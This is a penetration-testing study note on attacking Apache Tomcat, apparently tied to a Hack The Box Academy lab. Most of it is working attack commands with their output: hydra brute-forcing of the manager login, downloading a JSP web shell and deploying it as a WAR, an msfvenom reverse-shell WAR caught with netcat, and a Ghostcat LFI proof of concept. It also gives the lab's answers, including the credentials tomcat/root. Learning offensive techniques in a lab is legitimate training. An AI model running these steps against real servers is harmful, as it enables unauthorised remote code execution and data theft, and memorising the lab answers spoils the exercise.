---
description: >-
  If we can access the /manager or /host-manager endpoints, we can likely
  achieve remote code execution on the Tomcat server
---

# Attacking Tomcat

## Tomcat Manager - Login Brute Force

```
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

{% embed url="https://github.com/oppsec/tomcter" %}
This seems interesting to try
{% endembed %}

Tomcat uses basic auth where credential pair are base64 encoded and placed into Authorization header&#x20;

## Tomcat Manager - WAR File Upload

* Many Tomcat installations provide a GUI interface to manage the application
* The interface is available at `/manager/html` by default
* Only `manager-gui` role are allowed to access.
* A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png" alt=""><figcaption><p>http://web01.inlanefreight.local:8180/manager/html</p></figcaption></figure>

* A WAR file can be created using the zip utility.
* A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

```shell-session
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```

Click on `Browse` to select the .war file and then click on `Deploy`.

![image](https://academy.hackthebox.com/storage/modules/113/mgr\_deploy.png)

<figure><img src="https://academy.hackthebox.com/storage/modules/113/war_deployed.png" alt=""><figcaption><p>/backup appeared in table</p></figcaption></figure>

click on `backup`, we will get redirected to `http://web01.inlanefreight.local:8180/backup/` and get a `404 Not Found` error.

specify the `cmd.jsp` file in the URL as well, this will give us a webshell that we can use to run commands on Tomcat server.

```shell-session
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```

> undeploy -> to clean up the webshell

**`msfvenom` to generate a malicious WAR file**

```shell-session
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

```shell-session
nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224


id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

## CVE-2020-1938 : Ghostcat

* Tomcat was found to be vulnerable to an unauthenticated LFI
* Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable
* caused by a misconfiguration in the AJP protocol used by Tomcat
* AJP service is usually running at port 8009 on a Tomcat server

```shell-session
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

scan confirms that ports 8080 and 8009 are open

* PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).

```shell-session
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.

## Assessment

**Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?**

```
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

* tomcat

**What is the password?**

* root

**Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat\_flag.txt**

```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```

browse > deploy

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption><p>/backup</p></figcaption></figure>

